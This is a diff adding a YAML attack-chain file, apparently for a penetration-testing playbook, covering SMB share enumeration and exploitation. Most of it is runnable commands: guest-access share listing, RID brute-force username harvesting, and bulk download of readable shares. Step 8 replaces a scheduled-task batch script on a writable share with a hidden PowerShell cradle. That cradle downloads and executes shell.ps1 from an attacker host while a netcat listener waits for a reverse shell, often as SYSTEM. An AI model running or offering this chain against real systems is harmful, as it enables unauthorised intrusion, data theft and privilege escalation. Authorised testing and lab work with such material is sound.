@@ -1,0 +1,92 @@
+chain_id: smb_enumeration_and_shares
+title: "SMB enumeration + share read/write exploitation"
+severity: HIGH
+tags: [smb, netbios, shares, enum4linux, netexec, read, write, reverse-shell]
+
+trigger:
+  any_of:
+    - { port: 445 }
+    - { port: 139 }
+    - { service_pattern: "(?i)microsoft-ds|netbios-ssn" }
+
+description: |
+  Open SMB detected (139/tcp NetBIOS or 445/tcp microsoft-ds). Enumerate
+  shares first; if any are READ-only, dump their contents; if any are
+  WRITABLE and contain scripts run by scheduled tasks, replace them with
+  a reverse-shell payload to obtain code execution (often as SYSTEM).
+
+steps:
+  - id: 1
+    title: "List shares without credentials"
+    command: smbclient -L //$VICTIMA -N
+
+  - id: 2
+    title: "Map permissions"
+    command: smbmap -H $VICTIMA
+
+  - id: 3
+    title: "Exhaustive enumeration"
+    command: enum4linux -a $VICTIMA | tee enum4linux.txt
+
+  - id: 4
+    title: "Guest access check"
+    command: netexec smb $VICTIMA -u guest -p '' --shares
+
+  - id: 5
+    title: "Recursive content listing"
+    command: smbmap -H $VICTIMA -u guest -p '' -R
+
+  - id: 6
+    title: "Username harvesting via RID brute"
+    command: netexec smb $VICTIMA -u guest -p '' --rid-brute | grep SidTypeUser
+
+  - id: 7
+    title: "READ share — connect and download"
+    command: |
+      smbclient //$VICTIMA/NOMBRE_SHARE -N
+      # Inside smbclient:
+      recurse ON
+      prompt OFF
+      ls
+      mget *
+      exit
+    notes: |
+      Replace NOMBRE_SHARE with a share listed in step 4. `ls` already shows
+      hidden files inside smbclient — do NOT type `ls -la` (Bash-only).
+
+  - id: 8
+    title: "WRITE share — replace a scheduled script with a reverse shell"
+    command: |
+      # Download original to understand it
+      smbclient //$VICTIMA/NOMBRE_SHARE -N -c 'cd ruta; get script.bat'
+      cat script.bat
+      # Build malicious script
+      cat > exploit.bat << 'EOF'
+      @echo off
+      powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/shell.ps1')"
+      EOF
+    notes: |
+      Three terminals on Kali (listener / web server / upload):
+        nc -lvnp 4444
+        python3 -m http.server 8000
+        smbclient //$VICTIMA/NOMBRE_SHARE -N -c 'cd ruta; put exploit.bat script.bat'
+      Next time the scheduled task runs the script, a reverse shell drops in
+      with elevated privileges (often SYSTEM).
+
+  - id: 9
+    title: "Connect to a share with credentials (if obtained)"
+    command: smbclient //$VICTIMA/NOMBRE_SHARE -U USUARIO%PASSWORD
+
+common_errors:
+  - error: "NT_STATUS_NO_SUCH_FILE listing \\-la"
+    solution: |
+      `ls -la` was typed inside smbclient. Use just `ls` — smbclient's `ls`
+      already shows hidden files.
+  - error: "NT_STATUS_ACCESS_DENIED on every share"
+    solution: |
+      Try guest with empty password, then any creds harvested from FTP/web:
+        netexec smb $VICTIMA -u guest -p '' --shares
+        smbclient //$VICTIMA/share -U USUARIO%PASSWORD
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
